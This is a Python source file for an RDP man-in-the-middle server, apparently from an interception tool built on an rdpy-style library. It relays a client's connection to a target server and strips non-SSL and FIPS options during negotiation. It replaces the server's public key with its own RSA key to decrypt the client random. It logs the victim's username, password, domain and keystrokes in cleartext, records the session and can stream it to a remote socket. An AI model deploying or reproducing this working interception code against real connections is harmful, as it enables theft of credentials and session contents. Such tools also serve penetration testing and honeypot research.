import datetime
import logging
import random
import socket
from Crypto.PublicKey import RSA

from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from rdpy.core import log
from rdpy.core.crypto import SecuritySettings, RC4CrypterProxy
from rdpy.enum.core import ParserMode
from rdpy.enum.mcs import MCSResult
from rdpy.enum.rdp import NegotiationProtocols, RDPDataPDUSubtype, InputEventType, EncryptionMethod, EncryptionLevel, \
    RDPPlayerMessageType
from rdpy.layer.mcs import MCSLayer
from rdpy.layer.rdp.data import RDPDataLayer
from rdpy.layer.rdp.licensing import RDPLicensingLayer
from rdpy.layer.rdp.security import createNonTLSSecurityLayer, TLSSecurityLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer, createFastPathParser
from rdpy.layer.x224 import X224Layer
from rdpy.mcs.channel import MCSChannelFactory, MCSServerChannel
from rdpy.mcs.server import MCSServerRouter
from rdpy.mcs.user import MCSUserObserver
from rdpy.mitm.client import MITMClient
from rdpy.mitm.observer import MITMSlowPathObserver, MITMFastPathObserver
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp.client_info import RDPClientInfoParser
from rdpy.parser.rdp.connection import RDPClientConnectionParser, RDPServerConnectionParser
from rdpy.parser.rdp.fastpath import RDPBasicFastPathParser
from rdpy.parser.rdp.negotiation import RDPNegotiationRequestParser, RDPNegotiationResponseParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSConnectResponsePDU
from rdpy.pdu.rdp.connection import ProprietaryCertificate, ServerSecurityData, RDPServerDataPDU
from rdpy.pdu.rdp.fastpath import RDPFastPathPDU
from rdpy.pdu.rdp.negotiation import RDPNegotiationResponsePDU, RDPNegotiationRequestPDU
from rdpy.protocol.rdp.x224 import ServerTLSContext
from rdpy.recording.recorder import Recorder, FileLayer, SocketLayer


class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName, recordHost, recordPort):
        self.mitm_log = logging.getLogger("mitm.server")
        self.mitm_connections_log = logging.getLogger("mitm.connections")
        MCSUserObserver.__init__(self)
        self.socket = None
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.clientConnector = None
        self.client = None
        self.originalNegotiationPDU = None
        self.targetNegotiationPDU = None
        self.serverData = None
        self.io = RDPDataLayer()
        self.securityLayer = None
        self.fastPathParser = None
        self.rc4RSAKey = RSA.generate(2048)
        self.securitySettings = SecuritySettings(SecuritySettings.Mode.SERVER)
        self.fileHandle = open("out/rdp_replay_{}_{}.rdpy"
                               .format(datetime.datetime.now().strftime('%Y%m%d_%H_%M%S'),
                                       random.randint(0, 1000)), "wb")
        if recordHost is not None and recordPort is not None:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.socket.connect((recordHost, recordPort))
            except socket.error as e:
                log.error("Could not connect to liveplayer: {}".format(e))
                self.socket = None

        recording_layers = [FileLayer(self.fileHandle)]
        if self.socket is not None:
            recording_layers.append(SocketLayer(self.socket))

        # Since we're intercepting communications from the original client (so we're a server),
        # We need to write back the packets as if they came from the client.
        self.recorder = Recorder(recording_layers, RDPBasicFastPathParser(ParserMode.CLIENT))

        self.supportedChannels = []

        self.useTLS = False
        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()
        self.router = MCSServerRouter(self.mcs, self)

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.tcp.createObserver(onConnection=self.onConnection, onDisconnection=self.onDisconnection)
        self.tpkt.createObserver(onUnknownHeader=self.onUnknownTPKTHeader)
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest, onDisconnectRequest=self.onDisconnectRequest)
        self.mcs.setObserver(self.router)
        self.router.createObserver(
            onConnectionReceived = self.onConnectInitial,
            onDisconnectProviderUltimatum = self.onDisconnectProviderUltimatum,
            onAttachUserRequest = self.onAttachUserRequest,
            onChannelJoinRequest = self.onChannelJoinRequest
        )

        self.ioSecurityLayer = None
        self.licensingLayer = None
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.gcc = GCCParser()
        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.targetNegotiationPDU

    def buildProtocol(self, addr):
        # Build protocol for the client side of the connection
        self.client = MITMClient(self, self.fileHandle, self.socket)
        return self.client.getProtocol()

    def logSSLParameters(self):
        log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                  self.tpkt.previous.transport.protocol._tlsConnection.master_key())

    def connectClient(self):
        # Connect the client side to the target machine
        self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, self)

    def onConnection(self, clientInfo):
        """
        :param clientInfo: Tuple containing the ip and port of the connected client.
        """
        # Connection sequence #0
        self.mitm_log.debug("TCP connected from {}:{}".format(clientInfo[0], clientInfo[1]))

    def onDisconnection(self, reason):
        self.mitm_log.debug("Connection closed: {}".format(reason))
        self.recorder.record(RDPFastPathPDU(0, []), RDPPlayerMessageType.CONNECTION_CLOSE)
        if self.client:
            self.client.disconnect()

        self.disconnectConnector()

    def onDisconnectRequest(self, pdu):
        self.mitm_log.debug("X224 Disconnect Request received")
        self.disconnect()

    def onDisconnectProviderUltimatum(self, pdu):
        self.mitm_log.debug("Disconnect Provider Ultimatum PDU received")
        self.disconnect()

    def disconnect(self):
        self.mitm_log.debug("Disconnecting")
        self.tcp.disconnect()
        self.disconnectConnector()

    def disconnectConnector(self):
        if self.clientConnector:
            self.clientConnector.disconnect()
            self.clientConnector = None

    def onUnknownTPKTHeader(self, header):
        self.mitm_log.error("Closing the connection because an unknown TPKT header was received. Header: 0x%02lx" % header)
        self.disconnect()

    def onConnectionRequest(self, pdu):
        # X224 Request
        self.mitm_log.debug("Connection Request received")

        # We need to save the original negotiation PDU because Windows will cut the connection if it sees that the requested protocols have changed.
        parser = RDPNegotiationRequestParser()
        self.originalNegotiationPDU = parser.parse(pdu.payload)

        self.targetNegotiationPDU = RDPNegotiationRequestPDU(
            self.originalNegotiationPDU.cookie,
            self.originalNegotiationPDU.flags,

            # Only SSL is implemented, so remove other protocol flags
            self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL if self.originalNegotiationPDU.requestedProtocols is not None else None,

            self.originalNegotiationPDU.correlationFlags,
            self.originalNegotiationPDU.correlationID,
            self.originalNegotiationPDU.reserved,
        )

        self.connectClient()

    def onConnectionConfirm(self, _):
        # X224 Response
        protocols = NegotiationProtocols.SSL if self.originalNegotiationPDU.tlsSupported else NegotiationProtocols.NONE

        parser = RDPNegotiationResponseParser()
        payload = parser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.originalNegotiationPDU.tlsSupported:
            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.useTLS = True

    def onConnectInitial(self, pdu):
        # MCS Connect Initial
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.mitm_log.debug("Connect Initial received")
        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)

        # FIPS is not implemented, so remove this flag if it's set
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        rdpClientDataPdu.securityData.encryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS
        rdpClientDataPdu.securityData.extEncryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS

        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    def onConnectResponse(self, pdu, serverData):
        # MCS Connect Response
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        if pdu.result != 0:
            self.mcs.send(pdu)
            return

        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        if cert:
            cert = ProprietaryCertificate(
                cert.signatureAlgorithmID,
                cert.keyAlgorithmID,
                cert.publicKeyType,
                self.rc4RSAKey,
                cert.signatureType,
                cert.signature,
                cert.padding
            )

        security = ServerSecurityData(
            # FIPS is not implemented so avoid using that
            serverData.security.encryptionMethod if serverData.security.encryptionMethod != EncryptionMethod.ENCRYPTION_FIPS else EncryptionMethod.ENCRYPTION_128BIT,
            serverData.security.encryptionLevel if serverData.security.encryptionLevel != EncryptionLevel.ENCRYPTION_LEVEL_FIPS else EncryptionLevel.ENCRYPTION_LEVEL_HIGH,
            serverData.security.serverRandom,
            cert
        )

        serverData.core.clientRequestedProtocols = self.originalNegotiationPDU.requestedProtocols
        serverData.network.channels = []

        self.securitySettings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    def onAttachUserRequest(self, _):
        # MCS Attach User Request
        self.client.onAttachUserRequest()

    def onAttachConfirmed(self, user):
        # MCS Attach User Confirm successful
        self.router.sendAttachUserConfirm(True, user.userID)

    def onAttachRefused(self, user, result):
        # MCS Attach User Confirm failed
        self.router.sendAttachUserConfirm(False, result)

    def onChannelJoinRequest(self, pdu):
        # MCS Channel Join Request
        if pdu.channelID == self.serverData.network.mcsChannelID:
            self.client.onChannelJoinRequest(pdu)
        else:
            self.router.sendChannelJoinConfirm(MCSResult.RT_SUCCESSFUL if pdu.channelID == 1004 else MCSResult.RT_USER_REJECTED, pdu.initiator, pdu.channelID, False)

    def onChannelJoinAccepted(self, userID, channelID):
        # MCS Channel Join Confirm successful
        self.router.sendChannelJoinConfirm(0, userID, channelID)

    def onChannelJoinRefused(self, user, result, channelID):
        # MCS Channel Join Confirm failed
        self.router.sendChannelJoinConfirm(result, user.userID, channelID)

    def buildChannel(self, mcs, userID, channelID):
        self.mitm_log.debug("building channel {} for user {}".format(channelID, userID))

        if channelID != self.serverData.network.mcsChannelID:
            return None
        else:
            encryptionMethod = self.serverData.security.encryptionMethod
            crypterProxy = RC4CrypterProxy()

            if self.useTLS:
                self.securityLayer = TLSSecurityLayer()
            else:
                self.securityLayer = createNonTLSSecurityLayer(encryptionMethod, crypterProxy)

            self.securitySettings.setObserver(crypterProxy)
            self.fastPathParser = createFastPathParser(self.useTLS, encryptionMethod, crypterProxy, ParserMode.SERVER)
            self.licensingLayer = RDPLicensingLayer()
            channel = MCSServerChannel(mcs, userID, channelID)

            channel.setNext(self.securityLayer)
            self.securityLayer.setLicensingLayer(self.licensingLayer)
            self.securityLayer.setNext(self.io)
            self.tpkt.setFastPathParser(self.fastPathParser)

            slowPathObserver = MITMSlowPathObserver(self.io, self.recorder, mode=ParserMode.SERVER)
            fastPathObserver = MITMFastPathObserver(self.tpkt, self.recorder, mode=ParserMode.SERVER)
            self.io.setObserver(slowPathObserver)
            self.tpkt.setObserver(fastPathObserver)
            self.securityLayer.createObserver(
                onClientInfoReceived = self.onClientInfoReceived,
                onSecurityExchangeReceived = self.onSecurityExchangeReceived
            )

            clientObserver = self.client.getChannelObserver(channelID)
            slowPathObserver.setPeer(clientObserver)
            fastPathObserver.setPeer(self.client.getFastPathObserver())

            slowPathObserver.setDataHandler(RDPDataPDUSubtype.PDUTYPE2_INPUT, self.onInputPDUReceived)

            if self.useTLS:
                self.securityLayer.securityHeaderExpected = True

            return channel

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.mitm_log.debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.securitySettings.setClientRandom(clientRandom)

    # Client Info Packet
    def onClientInfoReceived(self, pdu):
        """
        Record the PDU and send it to the MITMClient.
        :type pdu: rdpy.pdu.rdp.client_info.RDPClientInfoPDU
        """
        self.mitm_log.debug("Client Info received")
        self.mitm_connections_log.info("CLIENT INFO RECEIVED")
        self.mitm_connections_log.info("USER: {}".format(pdu.username))
        self.mitm_connections_log.info("PASSWORD: {}".format(pdu.password))
        self.mitm_connections_log.info("DOMAIN: {}".format(pdu.domain))
        self.recorder.record(pdu, RDPPlayerMessageType.CLIENT_INFO)
        self.client.onClientInfoReceived(pdu)

    def onLicensingPDU(self, pdu):
        self.mitm_log.debug("Sending Licensing PDU")
        self.securityLayer.securityHeaderExpected = False
        self.licensingLayer.sendPDU(pdu)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        # Unsure if still useful
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.mitm_log.debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.mitm_log.debug("Mouse position: x = %d, y = %d" % (event.x, event.y))